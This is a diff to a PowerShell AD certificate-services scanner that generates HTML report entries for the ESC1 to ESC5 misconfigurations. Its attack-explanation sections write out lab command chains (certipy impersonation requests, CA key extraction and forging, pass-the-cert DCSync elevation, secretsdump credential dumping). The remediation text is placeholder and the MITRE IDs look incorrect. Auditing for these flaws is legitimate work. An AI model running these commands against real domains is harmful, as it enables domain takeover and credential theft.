@@ -297,7 +297,7 @@ function Invoke-ADScanner {
                                             <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                                         </table></td>
                                         <td class="explanation">
-                                            <p>ESC1 is a vulnerability where a certificate template permits Client Authentication and allows the enrollee to supply a different username than their own using a Subject Alternative Name (SAN) without manager approval. 
+                                            <p>ESC1 is a vulnerability where a certificate template permits Client Authentication and allows a low-privileged enrollee to supply a different username than their own using a Subject Alternative Name (SAN) without manager approval. 
                                             A SAN is an extension that allows multiple identities to be bound to a certificate beyond just the subject of the certificate. A common use for SANs is supplying additional host names for HTTPS certificates. For example, if a web server hosts content for multiple domains, each applicable domain could be included in the SAN so that the web server only needs a single HTTPS certificate instead of one for each domain. This is all well and good for HTTPS certificates, but when combined with certificates that allow for domain authentication, a dangerous scenario can arise.</p>
                                             <p>This allows a low-privileged user to enroll in $($finding.Name) supplying a SAN of Administrator, and then authenticate as the domain administrator.</p> 
                                             <p class="links"><b>Further information:</b></p>
@@ -330,7 +330,7 @@ function Invoke-ADScanner {
                                                 <div class="attack-text">
                                                     <p>2. A low-privileged user can enroll in the certificate template specifying a UPN of a domain administrator in the SAN.</p>
                                                     <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC1-template -upn administrator@test.local -dns dc.test.local</p>
-                                                    <p>The low-privileged user can then use this certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain prvililege escalation.</p>
+                                                    <p>The low-privileged user can then use this certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
                                                     <p class="code">certipy auth -pfx administrator_dc.pfx -dc-ip 192.168.10.141</p>
                                                 </div>
                                                 <span class="image-cell">
@@ -338,7 +338,6 @@ function Invoke-ADScanner {
                                                         alt="Exploiting ESC1">
                                                 </span>
                                             </div>
-                                            <hr>
                                         </td>
                                     </tr>
                                 </tbody>
@@ -363,20 +362,478 @@ function Invoke-ADScanner {
 "@  
             }
             elseif($finding.Technique -eq "ESC2"){
+                $nospaceid = $finding.Technique.Replace(" ", "-")
                 $PKIhtml += @"
-"@
+                <tr>
+                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
+                    <td class="finding-riskcritical">$($finding.Risk)</td>
+                </tr>
+                <tr class="finding">
+                    <td colspan="3">
+                        <div class="finding-info">
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Issue</th>
+                                        <th>MITRE ATT&CK ref</th>
+                                        <th>Score</th>
+                                    </tr>
+                                    <tr>
+                                        <td>Low-privileged users can impersonate a domain administrator by enrolling in a vulnerable certificate template used for any purpose.</td>
+                                        <td>T-15940</td>
+                                        <td>+$($finding.Score)</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Relevant info</th>
+                                        <th>Issue explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td class="relevantinfo"><table>
+                                            <tr><td class="grey">Template Name</td><td>$($finding.Name)</td></tr>
+                                            <tr><td class="grey">DistinguishedName</td><td>$($finding.DistinguishedName)</td></tr>
+                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
+                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
+                                        </table></td>
+                                        <td class="explanation">
+                                            <p>ESC2 is a vulnerability where a certificate template can be used for ANY purpose for which a low-privileged user can enroll. Since the certificate can be used for any purpose, it can be used for the same technique as with ESC3 for most certificate templates. This invovles enrolling in the vulnerable certificate template, then using that enrolled certificate to enroll another certiifcate on behalf of another user (i.e a domain admin) permitted by the any purpose EKU.</p>
+                                            <p>This allows a low-privileged user to enroll in $($finding.Name), then use the certificate to enroll in another certificate template on behalf of a domain admin (permitted as the certificate can be used for any purpose).</p> 
+                                            <p class="links"><b>Further information:</b></p>
+                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
+                                            <p><a href="https://labs.lares.com/adcs-exploits-investigations-pt2/">Link 2</a></p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Attack explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>1. A low-privileged user can remotely enumerate vulnerable certificate templates using certipy. 
+                                                    </p>
+                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC2-1.png"
+                                                        alt="Finding ESC1">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>2. A low-privileged user can enroll in the certificate template.</p>
+                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC2-template</p>
+                                                    <p>The low-privileged user can then use the ANY purpose certificate to request a certificate in the "User" certificate template on behalf of a domain administrator</p>
+                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template User -on-behalf-of 'test\administrator' -pfx test.pfx</p>
+                                                    <p>The low-privileged user can then use this domain admin certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
+                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC2-2.png"
+                                                        alt="Exploiting ESC1">
+                                                </span>
+                                            </div>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Remediation (GPT to contextualize)</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <p>ESC2 remediation</p>
+                                            <p>run command 1</p>
+                                            <p>run command 2</p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </td>
+                </tr>
+"@ 
             }
             elseif($finding.Technique -eq "ESC3"){
+                $nospaceid = $finding.Technique.Replace(" ", "-")
                 $PKIhtml += @"
+                <tr>
+                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
+                    <td class="finding-riskcritical">$($finding.Risk)</td>
+                </tr>
+                <tr class="finding">
+                    <td colspan="3">
+                        <div class="finding-info">
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Issue</th>
+                                        <th>MITRE ATT&CK ref</th>
+                                        <th>Score</th>
+                                    </tr>
+                                    <tr>
+                                        <td>Low-privileged users can impersonate a domain administrator by enrolling in a vulnerable certificate template on behalf of another user.</td>
+                                        <td>T-15940</td>
+                                        <td>+$($finding.Score)</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Relevant info</th>
+                                        <th>Issue explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td class="relevantinfo"><table>
+                                            <tr><td class="grey">Template Name</td><td>$($finding.Name)</td></tr>
+                                            <tr><td class="grey">DistinguishedName</td><td>$($finding.DistinguishedName)</td></tr>
+                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
+                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
+                                        </table></td>
+                                        <td class="explanation">
+                                            <p>ESC3 is a vulnerability where a certificate template allows a low-privileged user to enroll for a certificate on behalf of another user by specifying the Certificate Request Agent EKU. This vulnerability is present when two certificate templates can be enrolled in by low privileged user, where, one allows the Certificate Request Agent EKU (to requesst certificate on behalf of other user) and another allows client authentication.</p>
+                                            <p>This allows a low-privileged user to enroll in $($finding.Name), then use the certificate obtained to request an additional certificate (co-sign a Certificate Signing Request (CSR)) on behalf of a domain admin in another template used for client authentication to impersonate them.</p> 
+                                            <p class="links"><b>Further information:</b></p>
+                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
+                                            <p><a href="https://labs.lares.com/adcs-exploits-investigations-pt2/">Link 2</a></p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Attack explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>1. A low-privileged user can remotely enumerate vulnerable certificate templates using certipy. 
+                                                    </p>
+                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC3-1.png"
+                                                        alt="Finding ESC3">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>2. A low-privileged user can enroll in the certificate template that permits enrolling on behalf of another user (ESC3-CRA - has the Certificate Request Agent EKU).</p>
+                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC3-CRA</p>
+                                                    <p>The low-privileged user can this obtained certificate to request a certificate in another template that allows authentication (ESC3-template) on behalf of a domain adminstator.</p>
+                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC3-template -on-behalf-of 'test\Administrator' -pfx test.pfx</p>
+                                                    <p>The low-privileged user can then use this domain admin certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
+                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC3-2.png"
+                                                        alt="Exploiting ESC3">
+                                                </span>
+                                            </div>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Remediation (GPT to contextualize)</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <p>ESC3 remediation</p>
+                                            <p>run command 1</p>
+                                            <p>run command 2</p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </td>
+                </tr>
 "@
             }
             elseif($finding.Technique -eq "ESC4"){
+                $nospaceid = $finding.Technique.Replace(" ", "-")
                 $PKIhtml += @"
-"@  
+                <tr>
+                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
+                    <td class="finding-riskcritical">$($finding.Risk)</td>
+                </tr>
+                <tr class="finding">
+                    <td colspan="3">
+                        <div class="finding-info">
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Issue</th>
+                                        <th>MITRE ATT&CK ref</th>
+                                        <th>Score</th>
+                                    </tr>
+                                    <tr>
+                                        <td>Low-privileged users have unsafe permissions over a certificate template allowing impersonation of a domain administrator.</td>
+                                        <td>T-15940</td>
+                                        <td>+$($finding.Score)</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Relevant info</th>
+                                        <th>Issue explanation</th>
+                                    </tr>
+                                    <tr>
+"@
+                    #Account for owner rights
+                    if($finding.Issue -match "Owner"){
+                        $PKIhtml += @"
+                        <td class="relevantinfo"><table>
+                        <tr><td class="grey">Template Name</td><td>$($finding.Name)</td></tr>
+                        <tr><td class="grey">DistinguishedName</td><td>$($finding.DistinguishedName)</td></tr>
+                        <tr><td class="grey">Owner</td><td>$($finding.Owner)</td></tr>
+                    </table></td>
+                    <td class="explanation">
+                                            <p>ESC4 is a vulnerability where low privileged users have unsafe permissions over a certificate template, giving them full control of the template. $($finding.Owner) has Owner rights over $($finding.Name), giving full control of the template.</p>
+                                            <p>This allows a low-privileged user to modify $($finding.Name) to be vulnerable to ESC1, enroll and supply a SAN of Administrator, and then authenticate as the domain administrator.</p> 
+"@
+                    } else{
+                        $PKIhtml += @"
+                        <td class="relevantinfo"><table>
+                        <tr><td class="grey">Template Name</td><td>$($finding.Name)</td></tr>
+                        <tr><td class="grey">DistinguishedName</td><td>$($finding.DistinguishedName)</td></tr>
+                        <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
+                        <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
+                    </table></td>
+                    <td class="explanation">
+                                            <p>ESC4 is a vulnerability where low privileged users have unsafe permissions over a certificate template, giving them full control of the template. $($finding.IdentityReference) has $($finding.ActiveDirectoryRights) over $($finding.DistinguishedName), giving full control of the template.</p>
+                                            <p>This allows a low-privileged user to modify $($finding.Name) to be vulnerable to ESC1, enroll and supply a SAN of Administrator, and then authenticate as the domain administrator.</p> 
+"@
+                    }
+                    $PKIhtml += @"
+                                            <p class="links"><b>Further information:</b></p>
+                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
+                                            <p><a href="https://redfoxsec.com/blog/exploiting-weak-acls-on-active-directory-certificate-templates-esc4/">Link 2</a></p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Attack explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>1. A low-privileged user can remotely enumerate vulnerable certificate templates using certipy. 
+                                                    </p>
+                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC4-1.png"
+                                                        alt="Finding ESC4">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>2. A low-privileged user can take the ESC4 template and change it to be vulnerable to ESC1 technique by using the unsafe permission over the template.</p>
+                                                    <p class="code">python3 entry.py template -u test@test.local -p 'Password123!' -template ESC4ACL-template -save-old</p>
+                                                    <p>The low-privileged user can then use the template to exploit ESC1, enroll in the modified certificate template specifying a UPN of a domain administrator in the SAN.</p>
+                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC4ACL-Template -upn administrator@test.local</p>
+                                                    <p>The low-privileged user can then use this domain admin certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
+                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC4-2.png"
+                                                        alt="Exploiting ESC4">
+                                                </span>
+                                            </div>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Remediation (GPT to contextualize)</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <p>ESC4 remediation - pki is tier 0 there should be no unsafe delegations on it</p>
+                                            <p>run command 1</p>
+                                            <p>run command 2</p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </td>
+                </tr>
+"@
             }
             elseif($finding.Technique -eq "ESC5"){
-                $PKIhtml += @"  
-"@  
+                $nospaceid = $finding.Technique.Replace(" ", "-")
+                $PKIhtml += @"
+                <tr>
+                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
+                    <td class="finding-riskcritical">$($finding.Risk)</td>
+                </tr>
+                <tr class="finding">
+                    <td colspan="3">
+                        <div class="finding-info">
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Issue</th>
+                                        <th>MITRE ATT&CK ref</th>
+                                        <th>Score</th>
+                                    </tr>
+                                    <tr>
+                                        <td>Low-privileged users can take control of a certificate authority and craft certificates for a domain administrator.</td>
+                                        <td>T-15940</td>
+                                        <td>+$($finding.Score)</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Relevant info</th>
+                                        <th>Issue explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td class="relevantinfo"><table>
+                                            <tr><td class="grey">Template Name</td><td>$($finding.Name)</td></tr>
+                                            <tr><td class="grey">DistinguishedName</td><td>$($finding.DistinguishedName)</td></tr>
+                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
+                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
+                                        </table></td>
+                                        <td class="explanation">
+                                            <p>ESC5 is a vulnerability where a low privileged user has unsafe rights over PKI objects such as the CA object in AD. $($finding.IdentityReference) has $($finding.ActiveDirectoryRights) over $($finding.DistinguishedName), giving full control of the certificate authority, and the domain PKI which is a tier 0 asset (as important as a domain controller).</p>
+                                            <p>Compromise of a certificate authority allows a user extract the CA privat ekey and use it to forge authentication certificates, allowing a user to craft certificates for a domain administrator.</p> 
+                                            <p class="links"><b>Further information:</b></p>
+                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
+                                            <p><a href="https://luemmelsec.github.io/Skidaddle-Skideldi-I-just-pwnd-your-PKI/#esc5">Link 2</a></p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Attack explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>1. A low-privileged user can search for rogue permissions over CA objects using bloodhound.</p> 
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC5-1.png" alt="Finding ESC5">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>2. With these permissions, the user can add shadow credentials to the CA object to obtain a certificate as the CA server.</p> 
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC5-2.png" alt="Finding ESC5">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>3. With shadow credentials, the user can extract the NTLM hash of the certificate authority.</p> 
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC5-3.png" alt="Finding ESC5">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>4. With the CA authority NTLM hash, a silver ticket can be crafted, then dump credentials to extract a local administrator credentials to get admin access to the PKI.</p> 
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC5-4.png" alt="Finding ESC5">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>5. With admin access to the CA, the CA certificate and private key can be extracted with certipy.</p>
+                                                    <p class="code">certipy ca -backup -ca 'test-CA-CA' -username administrator@ca.test.local -hashes :2b576acbe6bcfda7294d6bd18041b8fe</p>
+                                                    <p> The CA private key can then be used to craft a certificate for a domain administrator.</p>
+                                                    <p class="code">certipy forge -ca-pfx test-CA-CA.pfx -upn administrator@test.local -subject 'CN=Administrator,CN=Users,DC=test,DC=local'</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC5-5.png"
+                                                        alt="Finding ESC5">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>The certificate can be used with pass-the-cert to grant a user DCSync rights.</p>
+                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
+                                                   
+                                                    <p></p>
+                                                    <p class="code">certipy cert -pfx administrator_forged.pfx -nokey -out administrator.crt</p>
+                                                    
+                                                    <p></p>                                                                                                                                                       
+                                                    <p class="code">certipy cert -pfx administrator_forged.pfx -nocert -out administrator.key</p>
+                                                  
+                                                    <p></p>                                                                                                                                                         
+                                                    <p class="code">python3 /home/kali/Desktop/passthecert.py -action modify_user -crt administrator.crt -key administrator.key -target test -elevate -domain test.local -dc-ip 192.168.10.141</p>
+                                                    
+                                                    <p></p>    
+                                                    <p class="code">impacket-secretsdump test:'Password123!'@dc.test.local</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC5-6.png" alt="Exploiting ESC5">
+                                                </span>
+                                            </div>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Remediation (GPT to contextualize)</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <p>ESC5 remediation</p>
+                                            <p>run command 1</p>
+                                            <p>run command 2</p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </td>
+                </tr>
+"@
             }
             elseif($finding.Technique -eq "ESC6"){
                 $PKIhtml += @"
